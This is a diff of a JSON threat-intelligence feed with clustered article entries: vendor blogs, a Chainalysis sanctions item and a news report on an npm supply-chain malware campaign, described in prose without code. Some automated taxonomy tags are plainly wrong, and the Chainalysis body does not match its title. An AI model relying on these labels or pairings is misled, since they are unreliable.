-        "summary": "Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical ques",
-        "full_body": "Back to Blog Exposure Management Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes Ed Montgomery May 20, 2026 | Last updated on May 20, 2026 | xx min read DISCOVER THE COMMAND PLATFORM Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical questions: Which internet-facing assets are high risk? Where do privileged identities intersect with exploitable exposures? Which business units own unmanaged cloud infrastructure? What third-party SaaS applications expand our attack surface? Now, those same saved filters can be converted directly into live dashboard widgets. If your team can build a filter table, they can now build a dashboard. There’s no need to understand query syntax or rely on specialized expertise for common reporting needs. With just a few clicks, exposure views become shareable, persistent dashboards built on the same unified data model that powers Surface Command. Figure 1: Creating dashboard “widgets” in the Rapid7 Command Platform Reducing friction in exposure reporting For many organizations, the barrier to effective exposure management isn’t visibility, it’s friction. When dashboard creation requires query expertise, reporting slows down, operational teams depend on a small group of power users, executive visibility lags behind exposure reality, and CTEM initiatives stall under complexity. Filter-based widgets remove that bottleneck. Security teams can now spin up exposure dashboards in minutes, empower analysts and vulnerability teams to self-serve, deliver consistent reporting to leadership, and standardize exposure views across business units. This lowers the barrier to building and maintaining exposure intelligence across the organization, and that matters when “continuous” is the goal. A practical enabler for continuous threat exposure management (CTEM) Beyond a framework, CTEM is a discipline. One that treats exposure management as an ongoing cycle, not a point-in-time project. CTEM is commonly organized into five continuous steps: Scope – Define what you’re focusing on (systems, business services, exposure themes, time horizons). Discover – Identify the assets, identities, and exposures within scope. Prioritize – Determine what matters most based on risk and impact. Validate – Confirm exploitability and real-world likelihood. Mobilize – Drive remediation and measure progress. The challenge isn’t describing these steps. It’s making them repeatable in day-to-day operations, and that’s where filter-based dashboard widgets help. Making “scope” real, not a slide deck CTEM often succeeds or fails at the first step: scope. If “scope” lives in a document, teams interpret it differently. If it lives on the platform, it becomes operational. Saved filters are an effective way to define scope in a way teams can actually use. Let’s take a look at some examples: “Internet-facing assets owned by customer-facing business units” “Privileged identities with access to production” “Externally exposed services supporting payment workflows” “Cloud assets without an identified owne",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [],
-          "content_type": "uncategorized",
-          "confidence_tier": "tier_1_offensive_research"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "Rapid7",
-          "cohort": "offensive_vulnerability_research",
-          "title": "Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes",
-          "link": "https://www.rapid7.com/blog/post/em-operationalizing-ctem-building-surface-command-dashboards",
-          "published": "2026-05-20T12:15:54+00:00",
-          "summary": "Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical ques",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_1_offensive_research"
-          }
-        }
-      ]
-    },
-    {
       "cluster_id": "6f1e50f7d3",
       "priority_score": 11,
       "member_count": 1,
@@ -6024,7 +5919,7 @@
       ]
     },
     {
-      "cluster_id": "40b3852cb4",
+      "cluster_id": "4fa65d0591",
       "priority_score": 11,
       "member_count": 1,
       "corroborating_source_count": 1,
@@ -6033,71 +5928,59 @@
         "threat_categories": [],
         "actor_attribution": [],
         "affected_industries": [],
-        "affected_products": [
-          "AWS"
-        ],
+        "affected_products": [],
         "cve_ids": [],
         "attack_techniques": [],
         "geographic_scope": [],
-        "urgency_signals": [
-          "poc_available"
-        ],
+        "urgency_signals": [],
         "content_type": [
           "uncategorized"
         ],
         "confidence_tier": [
-          "tier_2_operator"
+          "tier_1_offensive_research"
         ]
       },
       "primary": {
-        "source": "AWS Security Blog",
-        "cohort": "cloud_identity_infrastructure",
-        "title": "AWS Security Hub Extended: Why enterprise security products should sell themselves",
-        "link": "https://aws.amazon.com/blogs/security/aws-security-hub-extended-why-enterprise-security-products-should-sell-themselves/",
-        "published": "2026-05-20T17:32:58+00:00",
-        "summary": "Our largest security services customers started the same way every customer does – with a click. They enabled Amazon GuardDuty, Amazon Inspector, AWS WAF, and AWS Security Hub, experienced the benefits in real time, and evaluated with transparent pay-as-you-go pricing. No RFP. No six-month evaluation. No multi-year commitment up front. Our field teams played a […]",
-        "full_body": "AWS Security Blog AWS Security Hub Extended: Why enterprise security products should sell themselves Our largest security services customers started the same way every customer does – with a click. They enabled Amazon GuardDuty, Amazon Inspector, AWS WAF, and AWS Security Hub, experienced the benefits in real time, and evaluated with transparent pay-as-you-go pricing. No RFP. No six-month evaluation. No multi-year commitment up front. Our field teams played a critical role in that growth, not by selling the first click, but by building the trusted relationships that turned early adoption into deep, long-term commitment. We believe customers should have this same frictionless adoption experience and flexibility for all best-in-class security products and that’s why we developed Security Hub Extended. In our first post , we introduced Security Hub Extended, a significant expansion of Security Hub that brings together curated partner solutions in a single, unified experience. In our second post , we walked through how it works technically, including the onboarding flow, the pricing model, the unified operations layer built on the Open Cybersecurity Schema Framework (OCSF). In this post, I want to step back and talk about why we built it the way we did and why I believe the way enterprises discover, evaluate, and adopt security solutions is ready for a fundamental shift. The shift If you’ve ever tried to evaluate a new enterprise security product, you know the drill. Request a demo. Wait. Take the demo. Request a PoC. Wait for professional services (or your team to stop building) to set it up. Negotiate pricing, which isn’t published, so you’re starting blind. Loop in procurement. Sign a multi-year commitment. Then, months later, find out whether the product actually solves your problem in your unique environment. Meanwhile, an ambitious security engineer on your team has already spun up an open-source tool, connected real data, and knows in two hours whether it’s going to work for your use cases. They didn’t need a slide deck. They needed a solution they could put their hands on. A Fortune 500 CISO recently told me: “I spent 9 months procuring a security solution and it still doesn’t work the way the demo showed.” That frustration isn’t unique. It’s the norm. This isn’t a criticism of the sales motion. Sales-led has evolved for good reason. Enterprise procurement is complex, products need customization, customers need support. I respect the craft and have poured a significant portion of my career into trying to perfect it. Even the most product-driven companies still need great sales, marketing, field enablement, and support. It doesn’t change the fact that threats are evolving constantly, and defenders need the flexibility to discover and deploy new solutions as fast as the landscape shifts. Having the best solutions discoverable and deployable in that moment of need isn’t just a convenience, it’s a competitive advantage that customers are demanding. A new threat emerges, security teams have access to industry-leading solutions, and in a few clicks they’ve found their answer and are already seeing value. That’s the model every security company should be building toward. What we’ve learned at AWS At AWS, we’ve spent two decades learning what it takes to let customers adopt complex enterprise technology on their own terms, at massive scale. We haven’t always gotten it right, but we learn fast and adjust. The result is one of the largest cloud businesses in the world. I bring up that scale for one reason. It’s proof that complex, enterprise-grade technology can be adopted without requiring a traditional procurement gauntlet. Compute, storage, databases, AI/ML, networking, and yes, security — adopted all through a console, on each customer’s own timeline, and scaled when they were ready. The proof is in the adoption Amazon GuardDuty, Amazon Inspector, AWS Shield, AWS Security Hub are all available through the AWS Management Console.",
+        "source": "Rapid7",
+        "cohort": "offensive_vulnerability_research",
+        "title": "Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes",
+        "link": "https://www.rapid7.com/blog/post/em-operationalizing-ctem-building-surface-command-dashboards",
+        "published": "2026-05-20T12:15:54+00:00",
+        "summary": "Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical ques",
+        "full_body": "Back to Blog Exposure Management Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes Ed Montgomery May 20, 2026 | Last updated on May 20, 2026 | xx min read DISCOVER THE COMMAND PLATFORM Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical questions: Which internet-facing assets are high risk? Where do privileged identities intersect with exploitable exposures? Which business units own unmanaged cloud infrastructure? What third-party SaaS applications expand our attack surface? Now, those same saved filters can be converted directly into live dashboard widgets. If your team can build a filter table, they can now build a dashboard. There’s no need to understand query syntax or rely on specialized expertise for common reporting needs. With just a few clicks, exposure views become shareable, persistent dashboards built on the same unified data model that powers Surface Command. Figure 1: Creating dashboard “widgets” in the Rapid7 Command Platform Reducing friction in exposure reporting For many organizations, the barrier to effective exposure management isn’t visibility, it’s friction. When dashboard creation requires query expertise, reporting slows down, operational teams depend on a small group of power users, executive visibility lags behind exposure reality, and CTEM initiatives stall under complexity. Filter-based widgets remove that bottleneck. Security teams can now spin up exposure dashboards in minutes, empower analysts and vulnerability teams to self-serve, deliver consistent reporting to leadership, and standardize exposure views across business units. This lowers the barrier to building and maintaining exposure intelligence across the organization, and that matters when “continuous” is the goal. A practical enabler for continuous threat exposure management (CTEM) Beyond a framework, CTEM is a discipline. One that treats exposure management as an ongoing cycle, not a point-in-time project. CTEM is commonly organized into five continuous steps: Scope – Define what you’re focusing on (systems, business services, exposure themes, time horizons). Discover – Identify the assets, identities, and exposures within scope. Prioritize – Determine what matters most based on risk and impact. Validate – Confirm exploitability and real-world likelihood. Mobilize – Drive remediation and measure progress. The challenge isn’t describing these steps. It’s making them repeatable in day-to-day operations, and that’s where filter-based dashboard widgets help. Making “scope” real, not a slide deck CTEM often succeeds or fails at the first step: scope. If “scope” lives in a document, teams interpret it differently. If it lives on the platform, it becomes operational. Saved filters are an effective way to define scope in a way teams can actually use. Let’s take a look at some examples: “Internet-facing assets owned by customer-facing business units” “Privileged identities with access to production” “Externally exposed services supporting payment workflows” “Cloud assets without an identified owne",
         "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [],
           "actor_attribution": [],
           "affected_industries": [],
-          "affected_products": [
-            "AWS"
-          ],
+          "affected_products": [],
           "cve_ids": [],
           "attack_techniques": [],
           "geographic_scope": [],
-          "urgency_signals": [
-            "poc_available"
-          ],
+          "urgency_signals": [],
           "content_type": "uncategorized",
-          "confidence_tier": "tier_2_operator"
+          "confidence_tier": "tier_1_offensive_research"
         }
       },
       "corroborating_sources": [
         {
-          "source": "AWS Security Blog",
-          "cohort": "cloud_identity_infrastructure",
-          "title": "AWS Security Hub Extended: Why enterprise security products should sell themselves",
-          "link": "https://aws.amazon.com/blogs/security/aws-security-hub-extended-why-enterprise-security-products-should-sell-themselves/",
-          "published": "2026-05-20T17:32:58+00:00",
-          "summary": "Our largest security services customers started the same way every customer does – with a click. They enabled Amazon GuardDuty, Amazon Inspector, AWS WAF, and AWS Security Hub, experienced the benefits in real time, and evaluated with transparent pay-as-you-go pricing. No RFP. No six-month evaluation. No multi-year commitment up front. Our field teams played a […]",
+          "source": "Rapid7",
+          "cohort": "offensive_vulnerability_research",
+          "title": "Operationalizing CTEM Faster: Build Surface Command Dashboards in Minutes",
+          "link": "https://www.rapid7.com/blog/post/em-operationalizing-ctem-building-surface-command-dashboards",
+          "published": "2026-05-20T12:15:54+00:00",
+          "summary": "Modern attack surfaces don’t sit still. Cloud expansion, SaaS sprawl, identity complexity, and shadow IT are continuously reshaping organizational risk. For security leaders, visibility isn’t the challenge anymore, but actually operationalizing that visibility is. Surface Command was built to unify asset and identity intelligence across your external attack surface. But translating that intelligence into executive-ready dashboards or operational reporting has often required knowledge of Cypher queries. Today, that changes: We’re introducing filter-based dashboard widgets in Surface Command, enabling teams to build meaningful attack surface management (ASM) dashboards in minutes, without writing a single query. And for CISOs focused on advancing continuous threat exposure management ( CTEM ), this is more than a usability enhancement. It’s an operational accelerator. From filters to dashboards, instantly Security teams already use saved asset and identity filters to answer critical ques",
           "taxonomy": {
             "threat_categories": [],
             "actor_attribution": [],
             "affected_industries": [],
-            "affected_products": [
-              "AWS"
-            ],
+            "affected_products": [],
             "cve_ids": [],
             "attack_techniques": [],
             "geographic_scope": [],
-            "urgency_signals": [
-              "poc_available"
-            ],
+            "urgency_signals": [],
             "content_type": "uncategorized",
-            "confidence_tier": "tier_2_operator"
+            "confidence_tier": "tier_1_offensive_research"
           }
         }
       ]
@@ -6176,21 +6059,25 @@
       ]
     },
     {
-      "cluster_id": "220b411619",
+      "cluster_id": "878f1a3efd",
       "priority_score": 11,
       "member_count": 1,
       "corroborating_source_count": 1,
       "strong_signals": [],
       "taxonomy": {
-        "threat_categories": [],
-        "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [
-          "Anthropic/Claude"
+        "threat_categories": [
+          "policy_regulation"
         ],
+        "actor_attribution": [],
+        "affected_industries": [
+          "financial_services"
+        ],
+        "affected_products": [],
         "cve_ids": [],
         "attack_techniques": [],
-        "geographic_scope": [],
+        "geographic_scope": [
+          "iran"
+        ],
         "urgency_signals": [],
         "content_type": [
           "uncategorized"
@@ -6200,24 +6087,28 @@
         ]
       },
       "primary": {
-        "source": "Simon Willison",
-        "cohort": "ai_security_agentic_risk",
-        "title": "How fast is 10 tokens per second really?",
-        "link": "https://simonwillison.net/2026/May/20/tokens-per-second/#atom-everything",
-        "published": "2026-05-20T17:57:45+00:00",
-        "summary": "How fast is 10 tokens per second really? Neat little HTML app by Mike Veerman ( source code here ) which simulates LLM token output speeds from 5/second to 800/second. Useful if you see a model advertised as \"30 tokens/second\" and want to get a feel for what that actually looks like. Via Hacker News Tags: ai , generative-ai , llms",
-        "full_body": "Simon Willison’s Weblog Subscribe Sponsored by: Datadog — Ship reliable AI faster with LLM Observability. Read the best practices guide 20th May 2026 - Link Blog How fast is 10 tokens per second really? ( via ) Neat little HTML app by Mike Veerman ( source code here ) which simulates LLM token output speeds from 5/second to 800/second. Useful if you see a model advertised as \"30 tokens/second\" and want to get a feel for what that actually looks like. Posted 20th May 2026 at 5:57 pm Recent articles Gemini 3.5 Flash: more expensive, but Google plan to use it for everything - 19th May 2026 The last six months in LLMs in five minutes - 19th May 2026 Notes on the xAI/Anthropic data center deal - 7th May 2026 This is a link post by Simon Willison, posted on 20th May 2026 . ai 2028 generative-ai 1795 llms 1761 Monthly briefing Sponsor me for $10/month and get a curated email digest of the month's most important LLM developments. Pay me to send you less! Sponsor & subscribe Disclosures Colophon © 2002 2003 2004 2005 2006 2007 2008 2009 2010 2011 2012 2013 2014 2015 2016 2017 2018 2019 2020 2021 2022 2023 2024 2025 2026",
+        "source": "Chainalysis",
+        "cohort": "ransomware_ecrime_financial_crime",
+        "title": "OFAC Sanctions Sinaloa Cartel Fentanyl Trafficking and Crypto Laundering Network",
+        "link": "https://www.chainalysis.com/blog/sinaloa-cartel-fentanyl-trafficking-crypto-laundering-may-2026/",
+        "published": "2026-05-20T23:36:03+00:00",
+        "summary": "Summary The Department of the Treasury’s Office of Foreign Assets Control (OFAC) sanctioned more than a dozen individuals and entities… The post OFAC Sanctions Sinaloa Cartel Fentanyl Trafficking and Crypto Laundering Network appeared first on Chainalysis .",
+        "full_body": "Crime OFAC Updates Central Bank of Iran Designation Following Record $344 Million Tether Seizure amid Strait of Hormuz Toll Controversy April 27, 2026",
         "fetch_status": "ok",
         "taxonomy": {
-          "threat_categories": [],
-          "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [
-            "Anthropic/Claude"
+          "threat_categories": [
+            "policy_regulation"
           ],
+          "actor_attribution": [],
+          "affected_industries": [
+            "financial_services"
+          ],
+          "affected_products": [],
           "cve_ids": [],
           "attack_techniques": [],
-          "geographic_scope": [],
+          "geographic_scope": [
+            "iran"
+          ],
           "urgency_signals": [],
           "content_type": "uncategorized",
           "confidence_tier": "tier_2_operator"
@@ -6225,149 +6116,29 @@
       },
       "corroborating_sources": [
         {
-          "source": "Simon Willison",
-          "cohort": "ai_security_agentic_risk",
-          "title": "How fast is 10 tokens per second really?",
-          "link": "https://simonwillison.net/2026/May/20/tokens-per-second/#atom-everything",
-          "published": "2026-05-20T17:57:45+00:00",
-          "summary": "How fast is 10 tokens per second really? Neat little HTML app by Mike Veerman ( source code here ) which simulates LLM token output speeds from 5/second to 800/second. Useful if you see a model advertised as \"30 tokens/second\" and want to get a feel for what that actually looks like. Via Hacker News Tags: ai , generative-ai , llms",
-          "taxonomy": {
-            "threat_categories": [],
-            "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [
-              "Anthropic/Claude"
-            ],
-            "cve_ids": [],
-            "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [],
-            "content_type": "uncategorized",
-            "confidence_tier": "tier_2_operator"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "fab2ca6195",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
-        "threat_categories": [
-          "credential_attack",
-          "iot_ot",
-          "malware",
-          "supply_chain"
-        ],
-        "actor_attribution": [],
-        "affected_industries": [
-          "manufacturing_industrial",
-          "telecommunications"
-        ],
-        "affected_products": [
-          "AWS",
-          "Anthropic/Claude",
-          "GitHub",
-          "Google Cloud",
-          "Kubernetes",
-          "PyPI",
-          "npm"
-        ],
-        "cve_ids": [],
-        "attack_techniques": [],
-        "geographic_scope": [],
-        "urgency_signals": [
-          "no_patch_yet",
-          "poc_available"
-        ],
-        "content_type": [
-          "news_report"
-        ],
-        "confidence_tier": [
-          "tier_4_news"
-        ]
-      },
-      "primary": {
-        "source": "SecurityWeek",
-        "cohort": "cyber_news_breach_reporting",
-        "title": "Over 320 NPM Packages Hit by Fresh Mini Shai-Hulud Supply Chain Attack",
-        "link": "https://www.securityweek.com/over-320-npm-packages-hit-by-fresh-mini-shai-hulud-supply-chain-attack/",
-        "published": "2026-05-20T11:06:49+00:00",
-        "summary": "A compromised maintainer account was used to publish malicious package versions across the @antv namespace. The post Over 320 NPM Packages Hit by Fresh Mini Shai-Hulud Supply Chain Attack appeared first on SecurityWeek .",
-        "full_body": "A fresh Mini Shai-Hulud supply chain attack has hit over 320 NPM packages, along with GitHub Actions and a VS Code extension, security researchers report. The NPM maintainer account ‘atool’, which has access to multiple packages across the @antv namespace, and which publishes timeago.js (1.5 million weekly downloads), was compromised and used to publish malicious package versions. The attack propagated downstream to other highly popular packages, including echarts-for-react (~1.1 million weekly downloads), “impacting a much broader set of applications and continuous integration (CI) environments,” Microsoft warned on Tuesday. According to Socket , roughly 639 malicious versions of the compromised packages were published across “data visualization, graphing, mapping, charting, and React component ecosystems”. “Across the full Mini Shai-Hulud campaign we have tracked 1,055 versions across 502 unique packages. The campaign spans NPM, PyPI, and Composer, with NPM representing the overwhelming majority of the activity: 1,048 NPM versions across 498 unique NPM packages, plus 6 PyPI entries across 3 packages and 1 Composer package-version entry,” Socket notes. Most of the affected packages are in the @antv namespace and contain an install-time payload that triggers a multi-stage infection chain in which payloads are fetched from GitHub-hosted infrastructure. Secondary payloads designed to steal credentials and achieve persistence are also downloaded, Wiz says . Advertisement. Scroll to continue reading. “Every compromised package carries an obfuscated payload that reads GitHub Actions runner process memory to extract masked CI/CD secrets in plaintext, harvests credentials from over 130 file paths covering AWS, GCP, Azure, Kubernetes, HashiCorp Vault, cryptocurrency wallets, and developer tools, then exfiltrates stolen data through two channels,” StepSecurity explains. As with previous Mini Shai-Hulud attacks, the harvested data is exfiltrated through GitHub repositories and through a fallback server, suggesting that the infamous hacking group TeamPCP mounted the attack. “The payload also contains NPM registry abuse logic. It can validate npm tokens through npm registry APIs, enumerate packages maintainable by the token owner, download package tarballs, inject the malicious payload, add a preinstall hook, bump package versions, and republish modified packages under the compromised maintainer’s identity,” Socket says. Unlike the previous campaigns, however, the malware was now seen downloading and executing Python code from the attackers’ infrastructure, “effectively providing the operators with ongoing remote execution capabilities on compromised systems,” Wiz says. StepSecurity also observed the payload dropping persistent backdoors into Claude Code, and identified over 2,200 GitHub repositories containing exfiltrated data. Microsoft’s Durabletask Python SDK was also compromised in the fresh Mini Shai-Hulud campaign, with three malicious versions uploaded to PyPI within a 35-minute window, StepSecurity says . A fresh compromise of the popular GitHub Action actions-cool/issues-helper can also be linked to this campaign, Wiz says. Related: Real-World ICS Security Tales From the Trenches Related: Virtual Event Today: Threat Detection & Incident Response Summit Related: GitHub Confirms Hack Impacting 3,800 Internal Repositories Related: Verizon DBIR 2026: Vulnerability Exploitation Overtakes Credential Theft as Top Breach Vector Written By Ionut Arghire Ionut Arghire is an international correspondent for SecurityWeek. More from Ionut Arghire GitHub Confirms Hack Impacting 3,800 Internal Repositories Verizon DBIR 2026: Vulnerability Exploitation Overtakes Credential Theft as Top Breach Vector Unpatched ChromaDB Vulnerability Can Lead to Server Takeover B1ack’s Stash Marketplace Gives Away 4.6 Million Stolen Credit Cards 201 Arrested in Crackdown on Cybercrime in Middle East, North Africa PoC Released for DirtyDecrypt Linux Kernel Vulnerab",
-        "fetch_status": "ok",
-        "taxonomy": {
-          "threat_categories": [
-            "supply_chain",
-            "malware",
-            "credential_attack",
-            "iot_ot"
-          ],
-          "actor_attribution": [],
-          "affected_industries": [
-            "manufacturing_industrial",
-            "telecommunications"
-          ],
-          "affected_products": [
-            "AWS",
-            "Google Cloud",
-            "Kubernetes",
-            "GitHub",
-            "npm",
-            "PyPI",
-            "Anthropic/Claude"
-          ],
-          "cve_ids": [],
-          "attack_techniques": [],
-          "geographic_scope": [],
-          "urgency_signals": [
-            "poc_available",
-            "no_patch_yet"
-          ],
-          "content_type": "news_report",
-          "confidence_tier": "tier_4_news"
-        }
-      },
-      "corroborating_sources": [
-        {
-          "source": "SecurityWeek",
-          "cohort": "cyber_news_breach_reporting",
-          "title": "Over 320 NPM Packages Hit by Fresh Mini Shai-Hulud Supply Chain Attack",
-          "link": "https://www.securityweek.com/over-320-npm-packages-hit-by-fresh-mini-shai-hulud-supply-chain-attack/",
-          "published": "2026-05-20T11:06:49+00:00",
-          "summary": "A compromised maintainer account was used to publish malicious package versions across the @antv namespace. The post Over 320 NPM Packages Hit by Fresh Mini Shai-Hulud Supply Chain Attack appeared first on SecurityWeek .",
+          "source": "Chainalysis",
+          "cohort": "ransomware_ecrime_financial_crime",
+          "title": "OFAC Sanctions Sinaloa Cartel Fentanyl Trafficking and Crypto Laundering Network",
+          "link": "https://www.chainalysis.com/blog/sinaloa-cartel-fentanyl-trafficking-crypto-laundering-may-2026/",
+          "published": "2026-05-20T23:36:03+00:00",
+          "summary": "Summary The Department of the Treasury’s Office of Foreign Assets Control (OFAC) sanctioned more than a dozen individuals and entities… The post OFAC Sanctions Sinaloa Cartel Fentanyl Trafficking and Crypto Laundering Network appeared first on Chainalysis .",
           "taxonomy": {
             "threat_categories": [
-              "supply_chain",
-              "malware",
-              "credential_attack",
-              "iot_ot"
+              "policy_regulation"
             ],
             "actor_attribution": [],
             "affected_industries": [
-              "manufacturing_industrial",
-              "telecommunications"
+              "financial_services"
             ],
-            "affected_products": [
-              "AWS",
-              "Google Cloud",
-              "Kubernetes",
-              "GitHub",
-              "npm",
-              "PyPI",
-              "Anthropic/Claude"
-            ],
+            "affected_products": [],
             "cve_ids": [],
             "attack_techniques": [],
-            "geographic_scope": [],
-            "urgency_signals": [
-              "poc_available",
-              "no_patch_yet"
+            "geographic_scope": [
+              "iran"
             ],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news"
+            "urgency_signals": [],
+            "content_type": "uncategorized",
+            "confidence_tier": "tier_2_operator"
           }
         }
       ]
@@ -6468,14 +6239,20 @@
           "data_breach"
         ],
         "actor_attribution": [],
-        "affected_industries": [],
-        "affected_products": [],
+        "affected_industries": [
+          "telecommunications"
+        ],
+        "affected_products": [
+          "OpenAI/ChatGPT"
+        ],
         "cve_ids": [],
         "attack_techniques": [],
-        "geographic_scope": [],
+        "geographic_scope": [
+          "united_states"
+        ],
         "urgency_signals": [],
         "content_type": [
-          "news_report"
+          "threat_research"
         ],
         "confidence_tier": [
           "tier_4_news"
@@ -6488,20 +6265,26 @@
         "link": "https://www.darkreading.com/events/anatomy-of-a-data-breach-what-to-do-if-it-happens-to-you",
         "published": "2026-06-18T15:00:00+00:00",
         "summary": "",
-        "full_body": "",
-        "fetch_status": "not_attempted",
+        "full_body": "Home Events [Virtual Event] Anatomy of a Data Breach: What to Do if it Happens to You [Virtual Event] Anatomy of a Data Breach: What to Do if it Happens to You Jun 18, 2026 How do you ensure your SecOps team is prepared to respond to a cyberattack that exposes your critical data? This comprehensive virtual event examines the main vulnerabilities and exploits that lead to enterprise data breaches, plus the latest tools and best practices for conducting incident response. Get ahead of attackers and avoid becoming the next breach victim. Beat Hackers To It Explore the Agenda Beat Hackers To It Explore the Agenda Latest from [Virtual Event] Anatomy of a Data Breach: What to Do if it Happens to You Threat Intelligence Verizon DBIR: Enterprises Face a Dangerous Vulnerability Glut Verizon DBIR: Enterprises Face a Dangerous Vulnerability Glut by Alexander Culafi May 19, 2026 1 Min Read Editor's Choice Threat Intelligence From Stuxnet to ChatGPT: 20 News Events That Shaped Cyber From Stuxnet to ChatGPT: 20 News Events That Shaped Cyber by Dark Reading Editorial Team May 6, 2026 31 Min Read Cyber Risk Physical Cargo Theft Gets a Boost From Cybercriminals Physical Cargo Theft Gets a Boost From Cybercriminals by Robert Lemos May 4, 2026 5 Min Read Want more Dark Reading stories in your Google search results? Keep up with the latest cybersecurity threats, newly discovered vulnerabilities, data breach information, and emerging trends. Delivered daily or weekly right to your email inbox. Subscribe RSAC 2026: key news & insights At RSAC 2026, Dark Reading captured critical intelligence on AI, new attack methods, geopolitics, and much more Get Your Recap Webinars AI-Powered Cybersecurity for Resource-Constrained Organizations Thurs, June 18, 2026, at 1pm EST AI-Powered Credential Security: Intelligence Without Exposure Wed, June 17, 2026, at 1pm EST How Security Teams should apply Threat Intelligence into their Defenses Thurs, June 11, 2026 at 1pm EST Your Guide to Securing AI Adoption in Your Organization Tues, June 9, 2026 at 1pm EST What is the Right Role for Identity Threat Detection and Response (ITDR) in Your Organization? Wed, June 3, 2026 at 1pm EST More Webinars Black Hat USA | Mandalay Bay, Las Vegas The premier cybersecurity event of the year returns to Mandalay Bay with a re‑engineered, six‑day program built to ignite innovation, push boundaries, and bring the global security community together like never before. Use code: DARKREADING to save $200 on a Briefings pass or $100 on a Business pass. GET YOUR PASS",
+        "fetch_status": "ok",
         "taxonomy": {
           "threat_categories": [
             "data_breach"
           ],
           "actor_attribution": [],
-          "affected_industries": [],
-          "affected_products": [],
+          "affected_industries": [
+            "telecommunications"
+          ],
+          "affected_products": [
+            "OpenAI/ChatGPT"
+          ],
           "cve_ids": [],
           "attack_techniques": [],
-          "geographic_scope": [],
+          "geographic_scope": [
+            "united_states"
+          ],
           "urgency_signals": [],
-          "content_type": "news_report",
+          "content_type": "threat_research",
           "confidence_tier": "tier_4_news"
         }
       },
@@ -6518,80 +6301,19 @@
               "data_breach"
             ],
             "actor_attribution": [],
-            "affected_industries": [],
-            "affected_products": [],
+            "affected_industries": [
+              "telecommunications"
+            ],
+            "affected_products": [
+              "OpenAI/ChatGPT"
+            ],
             "cve_ids": [],
             "attack_techniques": [],
-            "geographic_scope": [],
+            "geographic_scope": [
+              "united_states"
+            ],
             "urgency_signals": [],
-            "content_type": "news_report",
-            "confidence_tier": "tier_4_news"
-          }
-        }
-      ]
-    },
-    {
-      "cluster_id": "1af1e98d82",
-      "priority_score": 11,
-      "member_count": 1,
-      "corroborating_source_count": 1,
-      "strong_signals": [],
-      "taxonomy": {
